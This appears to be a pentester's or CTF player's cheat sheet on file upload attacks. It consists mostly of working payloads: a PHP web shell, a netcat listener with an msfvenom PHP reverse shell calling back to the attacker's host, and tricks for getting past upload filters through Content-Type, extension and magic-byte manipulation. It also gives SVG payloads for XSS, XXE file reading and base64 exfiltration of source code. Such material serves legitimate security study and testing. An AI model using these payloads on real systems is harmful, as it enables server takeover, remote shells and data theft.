# File Upload Attacks

###

```shell
  <?php system($_GET["cmd"]); ?>
  
  nc -lvnp OUR_PORT
  msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
  # Check page source code, in payloads uncheck url encoding
  # In Burp change Content-Type to image/png and also the extension to php, from jpog, png or whatever to bypass client-side filtering
  # Agains blacklisting sniper attack with extension fuzzing for the correct file extension (seclists/discovery/web-content/web-extsensions)
  # whitelisting double extensions (file.jpg.php), use double fuzzing to find out tghe correct extension (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
  # Magic bytes so like GIF8 and change Content-Type and also extensin fuzzing
```

```shell
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
      <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
      <script type="text/javascript">alert(window.origin);</script>
  </svg>

  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
  <svg>&xxe;</svg>

  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
  <svg>&xxe;</svg>

  # put these into files like payload.svg, the second gets files conmtent directly, the third like a page, first is xss
  # check the upload script to find where it  is getting uploaded
```
